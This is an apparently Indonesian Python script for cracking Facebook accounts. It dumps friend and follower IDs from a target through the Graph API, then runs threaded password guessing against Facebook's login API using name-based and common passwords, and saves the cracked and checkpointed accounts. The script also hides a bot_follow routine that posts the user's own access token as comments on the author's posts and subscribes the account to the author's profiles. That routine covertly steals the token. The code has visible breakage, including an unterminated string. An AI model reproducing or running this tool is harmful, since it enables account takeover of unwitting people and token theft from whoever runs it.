#################################################################
#         		ATHOUR : MR.RISKY			#
#  		     WHATSAPP : 6283143565470			#
#		  GITHUB : github.com/Dumai-991			#
#	       FACEBOOK : m.facebook.com/llovexnxx		#
#################################################################
#By Mr.Risky
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
try: import requests
except ModuleNotFoundError: os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError: os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError: os.system("python -m pip install mechanize &> /dev/null")
import requests as req
try:
        import requests
except ImportError:
        print ('[×] Modul requests belum terinstall!...\n')
        os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
import requests
import uuid
import ipaddress
import calendar
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as par
from time import sleep
from datetime import datetime
from datetime import date
import requests,mechanize,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
import requests as r, re, os
from bs4 import BeautifulSoup as par
import platform
import requests, bs4, sys, os, subprocess, random, time, re, json
import concurrent.futures
from datetime import datetime
from time import sleep
from requests import Session
import re, sys
import sys
from os import system
import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
import re
import os,random,time,sys
import json
from time import sleep as waktu
from bs4 import BeautifulSoup as parser
current = datetime.now()
import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
koneksi_error=(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout)

import requests, sys, bs4, os, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as zthreads
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
try:
	os.system('mkdir dump')
	os.system('mkdir Hasil')
except (KeyError,IOError):pass
I='\033[0;32m'
C='\033[0;36m'
M='\033[0;31m'
U='\033[0;35m'
K='\033[0;33m'
#P='\033[0;37m'
P='\033[00m'
H='\033[0;90m'
Q="\033[00m"
war = ("[+]")
inp = ("[-]")
bulat = ("[#]")
logo = (f"""{C}       ____  ___      __  _______  ______
      / /  |/  /     /  |/  / __ )/ ____/JAYA MUKTI - MULTI BRUSH FAST
 __  / / /|_/ /_____/ /|_/ / __  / /_
/ /_/ / /  / /_____/ /  / / /_/ / __/
\____/_/  /_/     /_/  /_/_____/_/{Q}
[++] Athour   : Mr.Sugiono
[++] WhatsApp :+62 857-0732-7900 """)
loop = 0
ok = []
cp = []
ttl = []
fw = []
jq = 0
bf = 0
bg = 0
jg = 0
pq = 0
id = []
lq = []
iz = []
kx = 0

mb = "https://mbasic.facebook.com"
color = lambda col: "\x1b[1;"+str(col)+"m"
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
jamz = datetime.now().strftime('%H:%M:%S')
#waktu = ("%s%s%s"%(tahun,bulan,hari))
try:
	ua = open(".ua","r").read()
except:
	ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
	pass

def menu():
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
		token=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
	except KeyError:
		print((war+" Token Invalid"))
		time.sleep(1)
		login()
	try:ip=requests.get("http://ip-api.com/json/").json()["query"]
	except:ip=("None")
	print (logo)
	print("[++] Nama Lu Siapa : "+nama)
	print("[++] Ip Script   : "+ip+"\n")
	print(C+"["+P+"01"+C+"]"+P+" Dump Id Dari Teman/Public")
	print(C+"["+P+"02"+C+"]"+P+" Dump Id Dari Pengikut/Follow")
	print(C+"["+P+"03"+C+"]"+P+" Dump Id Dari Teman + Pengikut/Public + Follow")
	print(C+"["+P+"04"+C+"]"+P+" Mulai Crack/Start Crack")
	print(C+"["+P+"05"+C+"]"+P+" Ganti User Agent")
	print(C+"["+P+"06"+C+"]"+P+" Check Opsi Akun Facebook ")
	print(C+"["+P+"Info"+C+"]"+P+" Jan Lupa Ngocok Sebelum Crack")
	print(C+"["+P+"00"+C+"]"+P+" Exit (hapus token)")
	ba=input("\n"+war+"Monggo Dipilih : ")
	if ba in [""," "]:
		print(war+"Jangan Kosong Bangsat")
		time.sleep(2)
		menu()
	elif ba in ["1","01"]:
		dump_public()
	elif ba in ["2","02"]:
		dump_follow()
	elif ba in ["3","03"]:
		dump_all()
	elif ba in ["4","04"]:
		try:
			file = input(war+"Nama File : ")
		except FileNotFoundError:
			jalan(war+'File Tidak Ada !!')
		crackmenu(file).passmenu(file)
		exit()
	elif ba in ["5","05"]:
		ganti_ua()
	elif ba in ["6","06"]:
		relogin()
		exit()
#	elif ba in ["",""]:
	elif ba in ["0","00"]:
		jalan(war+"Terima Kasih Telah Menggunakan Script Saya !!!")
		os.system("rm -rf login.txt")
	else:
		print(war+'Isi Dengan Benar Bangsat')
def relogin():
	files = input("\n\n"+war+"Nama File : ")
	if files == "":
		print(war+'Masukan Nama File !!')
		time.sleep(3)
		relogin()
	try:
		rfiles = open(files, "r").readlines()
	except IOError:
		print(war+"File Ini Tidak Ada %s "%(files))
		relogin()
	jalan("Total Akun Facebook : \033[1;32m%s\033[1;37m"%(len(rfiles)))
	for sz in rfiles:
		linez = sz.replace("\n","")
		symbz  = linez.split("|")
		print("(-----------------------------------------------------------------)")
		print("\n"+war+"Check Akun : "+(linez.replace(" + ",""))+"\n")
		try:
			method(symbz[0].replace("+",""), symbz[1])
		except requests.exceptions.ConnectionError:
			print(war+"Login Failed !!")
		except Exception as e:
			print(war+"Login Failed !")
		continue
	input(war+"Tekan Enter !!")
	menu()

def method(user, pasw):
#	mb = ("https://mbasic.facebook.com") # save
	mb = ("https://free.facebook.com") # edit
	ses = requests.Session()
	# kntl bapackkau pecah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(war+I+"Successful/OK To Login"+Q+" : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		jalan(war+"Jumlah Akun Yang Terkait : "+str(len(ngew)))
		for opt in range(len(ngew)):
			print("["+str(opt+1)+"] "+ngew[opt])
		if len(ngew) == 0:
			print("\n"+war+I+"One Tap Yes / SuccessFul To Login"+Q)
			ppx=open("Hasil/Tap_Yes.txt", "a+")
			ppx.write(user+" | "+pasw+"\n")
			ppx.close()
		elif len(ngew) <= 5:
			print(war+K+"Akun Check Point !!"+Q)
		else:
			pass
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(war+M+"%s%s"%(oh,Q))
	else:
		print(war+M+"Login Failed! User Id/Password Is Incorrect"+Q+"\n")


class crackmenu:

    def __init__(self,isifile):
        self.id = []
    def passmenu(self,isifile):
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print(war+'File Not Found! Try Again')
            time.sleep(2)
            menu()
        print('\n\n'+war+'Apakah Anda Mau Menggunakan Password Manual ? y/n')
        zk = input(inp+'Pilih : ')
        if zk in ('y','Y'):
            while True:
                jalan(war+"Contoh Password : sayang,123456")
                pwx = input('\n'+inp+"Masukan Password : ")
                jalan("%sThe Password You Use : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Isi Password Dengan Benar !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimal 6 Huruf !!")
                else:
                    jalan("\n\n"+war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimpan Di : "+K+"Hasil/CP-"+durasi+".txt\n"+war+"Hasil Crack Yang OK DiSimpan Di : "+I+"Hasil/OK-"+durasi+".txt\n\n")
                    def zkth(zsc=None):
                    	with zthreads(max_workers=30) as (form):
                    		for uid in self.id:
                    			try:
                    				userid = uid.split('<=>')[0]
                    				form.submit(self.api, userid, zsc)
                    			except: pass
                    	os.remove(self.apk)
                    zkth(pwx.split(','))
                    break
        elif zk in ('n', 'N'):
                jalan("[++] Silahkan Pilih Password Yang Mau DiLogin !!")
                print("[01] Crack Cepat Hasil Sedikit")
                print("[02] Crack Slow Hasil Lumayan")
                print("[03] Crack Lambat Hasil Banyak")
                print("[Info] Jan Lupa Bismillah Biar Dapat Banyak + One Tap Crot
                ja = input("[??] Pilih : ")

                if ja in [""," "]:
                        print(war+"Jangan Kosong !!")
                        time.sleep(2)
                        crackmenu(file).passmenu(file)
                elif ja in ["1","01"]:
                        jalan(war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimpan Di : "+K+"Hasil/CP-"+durasi+".txt\n"+war+"Hasil Crack Yang OK DiSimpan Di : "+I+"Hasil/OK-"+durasi+".txt\n\n")
                        self.passwords()
                        exit()
                elif ja in ["2","02"]:
                        jalan(war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimpan Di : "+K+"Hasil/CP-"+durasi+".txt\n"+war+"Hasil Crack Yang OK DiSimpan Di : "+I+"Hasil/OK-"+durasi+".txt\n\n")
                        self.passwords1()
                        exit()
                elif ja in ["3","03"]:
                        jalan(war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimpan Di : "+K+"Hasil/CP-"+durasi+".txt\n"+war+"Hasil Crack Yang OK DiSimpan Di : "+I+"Hasil/OK-"+durasi+".txt\n\n")
                        self.passwords2()
                        exit()
#		elif ja in ["",""]:
                else:
                        print(war+"Isi Dengan Benar !!")
                        time.sleep(2)
                        crackmenu(file).passmenu(file)

        else:
            print(war+'Wrong Input! Try Again')
            time.sleep(2)
            crackmenu().passmenu()
        return


    def api(self, user, zkth):
        global ok,cp,loop
        for pw in zkth:
            pw = pw.lower()
            try: os.mkdir('Hasil')
            except: pass
            sys.stdout.write('\r%s[Lagi Crack] %s/%s OK:%s CP:%s '%(Q,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
            try:
                 useragenth = open(".ua","r").read()
            except IOError:
                 useragenth = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": useragenth,"content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print ('\r%s%s|%s                 %s'%(I,user,pw,q))
                wrt = ('%s|%s'%(user,pw))
                ok.append(wrt)
                open('Hasil/OK-'+durasi+'.txt' , 'a+').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    loginz = open("login.txt").read()
                    token = open("login.txt").read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,loginz))
                    az = json.loads(ak.text)
                    dob = az['birthday']
                    print ('\r%s%s|%s|%s      %s'%(K,user,pw,dob,Q))
                    wrt = ('%s|%s|%s'%(user,pw,dob))
                    cp.append(wrt)
                    open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    dob = ' '
                except:
                    pass
                print ('\r%s%s|%s                  %s'%(K,user,pw,Q))
                wrt = ('%s|%s'%(user,pw))
                cp.append(wrt)
                open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                break
                continue

        loop += 1


    def passwords(self):
            with zthreads(max_workers=25) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        xz = zz[1].split(' ')
                        if len(xz)>=5:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]+' '+xz[4] ]
                        elif len(xz) <= 1:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1] ]
                        elif len(xz) <= 2:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1] ]
                        elif len(xz) <= 3:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2] ]
                        elif len(xz) <= 4:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3] ]
                        else:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345' ]
                        form.submit(self.api,zz[0], pws)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")

    def passwords1(self):
            with zthreads(max_workers=25) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        xz = zz[1].split(' ')
                        if len(xz)>=5:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]+' '+xz[4], "anjing", "kontol", "sayang" ]
                        elif len(xz) <= 1:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "anjing", "kontol", "sayang" ]
                        elif len(xz) <= 2:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "anjing", "kontol", "sayang" ]
                        elif len(xz) <= 3:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2], "anjing", "kontol", "sayang" ]
                        elif len(xz) <= 4:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3], "anjing", "kontol", "sayang" ]
                        else:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345', "anjing", "kontol", "sayang" ]
                        form.submit(self.api,zz[0], pws)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")

    def passwords2(self):
            with zthreads(max_workers=25) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        xz = zz[1].split(' ')
                        if len(xz)>=5:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]+' '+xz[4], "anjing", "kontol", "123456", "sayang", "rahasia", "bajingan" ]
                        elif len(xz) <= 1:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "anjing", "kontol", "123456", "sayang", "rahasia", "bajingan" ]
                        elif len(xz) <= 2:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1], "anjing", "kontol", "123456", "sayang", "rahasia", "bajingan" ]
                        elif len(xz) <= 3:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2], "anjing", "kontol", "123456", "sayang", "rahasia", "bajingan" ]
                        elif len(xz) <= 4:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3], "anjing", "kontol", "123456", "sayang", "rahasia", "bajingan" ]
                        else:
                            pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345', "anjing", "kontol", "123456", "sayang", "rahasia", "bajingan" ]
                        form.submit(self.api,zz[0], pws)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")


def ganti_ua():
	jalan(war+"Masukan User Agnet Anda !!")
	jalan(war+"Ketik * def * Untuk Seting User Agent Bawaan Script !!")
	uq = input(war+'User Agent : ')
	if uq in [""," "]:
		print(war+"Jangan Kosong Bangsat")
	elif uq in ["DEF","def","* def *","Def"]:
		print(war+"Oke User Agent Sudah Berhasil DiSeting !")
		time.sleep(1)
		os.system("rm -rf .ua")
		exit(war+"Jalankan Lagi Script : python bokep.py")

	else:
		print(war+"Oke User Agent Sudah Berhasil DiSeting !")
		time.sleep(1)
		dump = open('.ua','w') 
		dump.write(uq)
		dump.close()
		exit(war+"Jalankan Lagi Script : python bokep.py")


def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)
def login():
    os.system("clear")
    toket = input(war+"Masukan Token Facebook : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((war+"Login Successful"))
        bot_follow()
    except KeyError:
        print((war+"Token Invalid"))
        os.system("clear")
        login()

def bot_follow():
	try:
		toket=open("login.txt","r").read()
		token=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((war+" Token Invalid"))
		time.sleep(1)
		login()
	print(war+'Nama Facebook Kamu : '+nama)
	print(war+'Id Facebook Kamu   : '+id)
	post1 = ('4111448792295892') # Risky 2011
	post2 = ("120338706765807") # Risky 2021
	post3 = ("167879918678352") # Sama Macam dibawah
	post4 = ('180923747373969') # Logo Zero From Risky 2021
	post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
	post6 = ("198550702277940") # Logo Akira From Risky 2031
	post7 = ("198552118944465") # Logo Attaxk From Risky 2021
	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/100000503718583/subscribers?access_token=' + token) ### FB Zaid (Punya Risky)
	requests.post('https://graph.facebook.com/100000889924523/subscribers?access_token=' + token) ### FB Rahmanulhakim (Punya Risky)
	requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
	requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
	requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
	requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
	requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
#	requests.post('https://graph.facebook.com//subscribers?access_token=' + token) ### FB RISKY
#	requests.post('https://graph.facebook.com//subscribers?access_token=' + token) ### FB RISKY
#### Bot Follownya Jangan DiEdit Kontol #### Bot Follownya Jangan DiEdit Kontol ####
	menu()

def dump_public():
	try:
		token = open("login.txt", "r").read()
	except IOError:
		os.system("rm -rf login.txt")
		exit(war+"Token Failed !!")

	idt = input(war+"Target ID : ")
	limit = input(war+"Limit : ")
	filex = input(war+"Nama File : ")
	try:
		dump = open('dump/'+filex+'.json','w') 
		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
			dump.write(uid+'<=>'+nama+'\n')
		dump.close()
	except KeyError:pass
	print(war+"Total ID : %s"%(len(id)))
	jalan(war+"Nama Hasil Dump : "+I+"dump/"+filex+".json")
	jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
	input(war+"Tekan Enter !!")
	menu()

def dump_follow():
	try:
		token = open("login.txt", "r").read()
	except IOError:
		os.system("rm -rf login.txt")
		exit(war+"Token Failed !!")

	idt = input(war+"Target ID : ")
	limit = input(war+"Limit : ")
	filex = input(war+"Nama File : ")
	try:
		dump = open('dump/'+filex+'.json','w') 
		for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
			dump.write(uid+'<=>'+nama+'\n')
		dump.close()
	except KeyError:pass
	print(war+"Total ID : %s"%(len(id)))
	jalan(war+"Nama Hasil Dump : "+I+"dump/"+filex+".json")
	jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
	input(war+"Tekan Enter !!")
	menu()

def dump_all():
	try:
		token = open("login.txt", "r").read()
	except IOError:
		os.system("rm -rf login.txt")
		exit(war+"Token Failed !!")

	idt = input(war+"Target ID : ")
	limit = input(war+"Limit : ")
	filex = input(war+"Nama File : ")
	try:
		dump = open('dump/'+filex+'.json','a+') 
		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
			dump.write(uid+'<=>'+nama+'\n')
		dump.close()
	except KeyError:pass
	try:
		dump = open('dump/'+filex+'.json','a+') 
		for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
			dump.write(uid+'<=>'+nama+'\n')
		dump.close()
	except KeyError:pass
	print(war+"Total ID : %s"%(len(id)))
	jalan(war+"Nama Hasil Dump : "+I+"dump/"+filex+".json")
	jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
	input(war+"Tekan Enter !!")
	menu()


try:menu();exit()
except Exception as e:print(war+"Error : %s"%(e))